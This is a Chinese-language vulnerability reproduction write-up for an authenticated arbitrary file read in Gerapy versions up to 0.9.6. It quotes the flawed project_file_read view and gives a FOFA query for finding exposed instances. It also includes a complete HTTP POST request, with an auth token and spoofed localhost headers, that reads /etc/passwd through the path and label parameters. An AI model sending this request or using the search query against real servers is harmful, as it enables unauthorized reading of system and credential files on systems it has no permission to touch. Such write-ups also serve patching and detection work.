# Gerapy read 后台任意文件读取漏洞

## 漏洞描述

Gerapy gerapy/server/core/views.py 中的 project_file_read 方法存在任意文件读取，攻击者登录后台后发送特定的请求包即可利用漏洞

## 漏洞影响

```
Gerapy <= 0.9.6
```

## FOFA

```
title="Gerapy"
```

## 漏洞复现

登录页面

![image-20220524145252413](./images/202205241452469.png)

出现漏洞的文件为 `gerapy/server/core/views.py`

![](./images/202205241453657.png)

```
@api_view(['POST'])
@permission_classes([IsAuthenticated])
def project_file_read(request):
    """
    get content of project file
    :param request: request object
    :return: file content
    """
    if request.method == 'POST':
        data = json.loads(request.body)
        path = join(data['path'], data['label'])
        # binary file
        with open(path, 'rb') as f:
            return HttpResponse(f.read().decode('utf-8'))
```

参数 path 和 label 都为用户可控变量，登录后构造请求包

```
POST /api/project/file/read HTTP/1.1
Host: 
Content-Length: 35
Accept: application/json, text/plain, */*
Authorization: Token 0fb31a60728efd8e6398349bea36fa7629bd8df0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
x-forwarded-for: 127.0.0.1
x-originating-ip: 127.0.0.1
x-remote-ip: 127.0.0.1
x-remote-addr: 127.0.0.1
Connection: close

{"path":"/etc/",
"label":"passwd"}
```

![](./images/202205241453910.png)